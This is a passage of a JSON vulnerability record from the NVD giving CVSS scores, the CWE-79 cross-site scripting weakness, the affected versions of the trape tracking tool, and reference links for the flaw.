[{"source": "nvd@nist.gov", "type": "Primary", "cvssData": {"version": "3.0", "vectorString": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", "attackVector": "NETWORK", "attackComplexity": "LOW", "privilegesRequired": "NONE", "userInteraction": "REQUIRED", "scope": "CHANGED", "confidentialityImpact": "LOW", "integrityImpact": "LOW", "availabilityImpact": "NONE", "baseScore": 6.1, "baseSeverity": "MEDIUM"}, "exploitabilityScore": 2.8, "impactScore": 2.7}], "cvssMetricV2": [{"source": "nvd@nist.gov", "type": "Primary", "cvssData": {"version": "2.0", "vectorString": "AV:N/AC:M/Au:N/C:N/I:P/A:N", "accessVector": "NETWORK", "accessComplexity": "MEDIUM", "authentication": "NONE", "confidentialityImpact": "NONE", "integrityImpact": "PARTIAL", "availabilityImpact": "NONE", "baseScore": 4.3}, "baseSeverity": "MEDIUM", "exploitabilityScore": 8.6, "impactScore": 2.9, "acInsufInfo": false, "obtainAllPrivilege": false, "obtainUserPrivilege": false, "obtainOtherPrivilege": false, "userInteractionRequired": true}]}, "weaknesses": [{"source": "nvd@nist.gov", "type": "Primary", "description": [{"lang": "en", "value": "CWE-79"}]}], "configurations": [{"nodes": [{"operator": "OR", "negate": false, "cpeMatch": [{"vulnerable": true, "criteria": "cpe:2.3:a:boxug:trape:*:*:*:*:*:*:*:*", "versionEndExcluding": "2017-11-05", "matchCriteriaId": "19D0D8F3-049F-4BF7-92C2-6D0FAE44C2DB"}]}]}], "references": [{"url": "https://github.com/boxug/trape/commit/628149159ba25adbfc29a3ae1d4b10c7eb936dd3", "source": "cve@mitre.org", "tags": ["Issue Tracking", "Patch", "Third Party Advisory"]}, {"url": "https://www.seekurity.com/blog/general/cve-2017-17713-and-cve-2017-17714-multiple-sql-injections-and-xss-vulnerabilities-found-in-the-hackers-tracking-tool-trape-boxug/", "source": "cve@mitre.org", "tags": ["Exploit", "Issue Tracking", "Patch", "Third Party Advisory"]}, {"url": "https://www.youtube.com/watch?v=Txp6IwR24jY", "source": "cve@mitre.org", "tags": ["Exploit", "Issue Tracking", "Third Party Advisory"]}]}, "github_commit_url": "https://github.com/boxug/trape/commit/628149159ba25adbfc29a3ae1d4b10c7eb936dd3"}}